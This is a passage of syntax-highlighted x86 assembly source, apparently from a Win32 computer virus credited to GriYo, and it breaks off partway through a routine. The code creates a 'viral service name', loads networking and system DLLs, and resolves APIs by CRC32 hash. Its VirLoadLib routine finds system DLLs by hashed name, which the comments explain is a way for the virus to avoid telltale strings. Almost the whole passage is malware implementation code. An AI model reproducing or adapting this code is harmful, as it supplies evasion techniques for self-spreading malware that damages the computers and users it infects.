                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MakeViralServiceName</span><span class="sc0">

</span><span class="sc5">DoneViralServiceName</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">VirusGetSysInfoError</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Load DLLs and locate functions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; NULL on error</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">LoadDllsAndLocateFunctions</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hADVAPI32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hUSER32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWSOCK32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;USER32</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcUSER32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumUSER32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrcApisUSER32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpApisUSER32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirLoadLib</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hUSER32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OneDllFailedToLoad</span><span class="sc0">

                </span><span class="sc1">;WSOCK32</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcWSOCK32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumWSOCK32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrcApisWSOCK32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpApisWSOCK32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirLoadLib</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWSOCK32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OneDllFailedToLoad</span><span class="sc0">

                </span><span class="sc1">;Initialize Windows sockets library by</span><span class="sc0">
                </span><span class="sc1">;issuing a call to WSAStartup</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WSAData</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_WSAStartup</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">OneDllFailedToLoad</span><span class="sc0">

                </span><span class="sc1">;Version check</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">system_version</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VER_PLATFORM_WIN32_NT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">UseWin9xADVAPI32</span><span class="sc0">

                </span><span class="sc1">;Get ADVAPI32 apis for Windows Nt</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumADVAPI32_nt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrcApisADVAPI32_nt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpApisADVAPI32_nt</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirLoadLib</span><span class="sc0">             
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hADVAPI32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">UseWin9xADVAPI32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VER_PLATFORM_WIN32_WINDOWS</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">OneDllFailedToLoad</span><span class="sc0">

                </span><span class="sc1">;Get ADVAPI32 apis for Windows 9x</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumADVAPI32_w9x</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrcApisADVAPI32_w9x</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpApisADVAPI32_w9x</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirLoadLib</span><span class="sc0">             
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hADVAPI32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OneDllFailedToLoad</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Unload DLLs</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">UnloadDlls</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWSOCK32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DoneWith_WSOCK32</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_WSACleanup</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">DoneWith_WSOCK32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hUSER32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DoneWith_USER32</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
                
</span><span class="sc5">DoneWith_USER32</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DoneWith_ADVAPI32</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">DoneWith_ADVAPI32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Make crc lookup table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Generate a table for a byte-wise 32-bit CRC calculation on the polynomial:</span><span class="sc0">
</span><span class="sc1">;x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Polynomials over GF(2) are represented in binary, one bit per coefficient,</span><span class="sc0">
</span><span class="sc1">;with the lowest powers in the most significant bit.  Then adding polynomials</span><span class="sc0">
</span><span class="sc1">;is just exclusive-or, and multiplying a polynomial by x is a right shift by</span><span class="sc0">
</span><span class="sc1">;one.  If we call the above polynomial p, and represent a byte as the</span><span class="sc0">
</span><span class="sc1">;polynomial q, also with the lowest power in the most significant bit (so the</span><span class="sc0">
</span><span class="sc1">;byte 0xb1 is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,</span><span class="sc0">
</span><span class="sc1">;where a mod b means the remainder after dividing a by b.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This calculation is done using the shift-register method of multiplying and</span><span class="sc0">
</span><span class="sc1">;taking the remainder.  The register is initialized to zero, and for each</span><span class="sc0">
</span><span class="sc1">;incoming bit, x^32 is added mod p to the register if the bit is a one (where</span><span class="sc0">
</span><span class="sc1">;x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod p by</span><span class="sc0">
</span><span class="sc1">;x (which is shifting right by one and adding x^32 mod p if the bit shifted</span><span class="sc0">
</span><span class="sc1">;out is a one).  We start with the highest power (least significant bit) of</span><span class="sc0">
</span><span class="sc1">;q and repeat for all eight bits of q.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The table is simply the CRC of all possible eight bit values.  This is all</span><span class="sc0">
</span><span class="sc1">;the information needed to generate CRC's on data a byte at a time for all</span><span class="sc0">
</span><span class="sc1">;combinations of CRC register values and incoming bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Original C code by Mark Adler</span><span class="sc0">
</span><span class="sc1">;Translated to asm for Win32 by GriYo</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc1">;Make exclusive-or pattern from polynomial (0EDB88320h)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The following commented code is an example of how to</span><span class="sc0">
</span><span class="sc1">;make the exclusive-or pattern from polynomial at runtime       </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               xor edx,edx</span><span class="sc0">
</span><span class="sc1">;               mov ecx,0000000Eh</span><span class="sc0">
</span><span class="sc1">;               mov ebx,offset CRC32Terms</span><span class="sc0">
</span><span class="sc1">;ComputePolynomial:     mov eax,ecx</span><span class="sc0">
</span><span class="sc1">;               xlatb</span><span class="sc0">
</span><span class="sc1">;               sub eax,0000001Fh</span><span class="sc0">
</span><span class="sc1">;               neg eax</span><span class="sc0">
</span><span class="sc1">;               bts edx,eax</span><span class="sc0">
</span><span class="sc1">;               loop ComputePolynomial</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;edx contains now the exclusive-or pattern</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The polynomial is:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; X^32+X^26+X^23+X^22+X^16+X^12+X^11+X^10+X^8+X^7+X^5+X^4+X^2+X^1+X^0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;CRC32Terms db 0,1,2,4,5,7,8,10,11,12,16,22,23,26       </span><span class="sc0">

</span><span class="sc5">CreateCRC32Table</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRC32LookupTable</span><span class="sc0">
</span><span class="sc5">CreateCRC32TableLoop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FFh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">               
</span><span class="sc5">CreateCRC32Value</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">CreateCRC32NextValue</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">CreateCRC32NextValue</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CreateCRC32Value</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CreateCRC32TableLoop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Return a 32bit CRC of the contents of the buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi -&gt; Ptr to buffer</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Buffer size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   edx -&gt; 32bit CRC</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetCRC32</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRC32LookupTable</span><span class="sc0">
</span><span class="sc5">ComputeLoopCRC32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FFh</span><span class="sc0">               
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ComputeLoopCRC32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get a 32bit CRC of a null terminated array</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi -&gt; Ptr to string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   edx -&gt; 32bit CRC</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetStringCRC32</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ComputeStringLoopCRC32</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ComputeStringLoopCRC32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCRC32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;VirLoadLib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;To use CRC32 instead of API names sounds cool... But there are still some</span><span class="sc0">
</span><span class="sc1">;strings authors cant get rid of... When calling LoadLibrary the virus must</span><span class="sc0">
</span><span class="sc1">;specify the DLL name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This routine is the solution to avoid the usage of DLL names</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  eax -&gt; CRC32 of DLL name</span><span class="sc0">
</span><span class="sc1">;               esi -&gt; CRC32 of API names</span><span class="sc0">
</span><span class="sc1">;               edi -&gt; Where to put API addresses</span><span class="sc0">
</span><span class="sc1">;               ecx -&gt; Number of APIs to find</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; Module handle or NULL on error</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">VirLoadLib</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_SDLL_CRC32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win32FindData</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_SearchSystemDLL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EVirLoadLib</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">h_Find</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CheckDllName</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win32FindData.WFD_szFileName</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StringBuffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_SDLL_CRC32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">OkCheckDll</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win32FindData</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">h_Find</span><span class="sc4">]</span><span class="sc0">
